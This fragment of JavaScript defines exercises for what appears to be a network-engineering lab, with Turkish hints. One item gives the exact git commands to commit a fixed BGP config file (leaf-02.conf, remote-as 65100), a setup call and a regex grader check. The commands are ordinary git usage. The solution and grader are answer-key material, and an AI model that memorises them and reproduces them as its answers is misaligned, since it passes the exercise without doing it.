    hint: "`git add` ile sadece leaf-02.conf'u verirsen yalnızca o dosya index'e girer, `git status` ile neyin staged olduğunu commit'ten önce kontrol et. `git commit -m` mesajında remote-as ya da 65100 geçsin, BGP sorununu arayan biri log'da bulabilsin. `git push` local commit'i remote'taki branch'e gönderir.",
    solution: 'cd ~/dc-fabric\ngit add leaf-02.conf\ngit status\ngit commit -m "leaf-02: restore spine remote-as 65100, fixes EVPN session down"\ngit push',
    setup: vopGitSetup(VOP_GB, 11),
    check: sh => vopGitCommitted(sh, VOP_GB, /65100|remote-as|bgp/i) },
], { hint: "`git add dosya` sadece o dosyayı index'e alır, `git add .` dersen stash'ten dönen NTP değişikliği de commit'e girer. `git commit -m` ile mesajı tırnak içinde ver, hostname ile başlasın ve mtu kelimesi geçsin. `git push` bu lab'da network olmadığı için hata verir, local history yine de senin." });
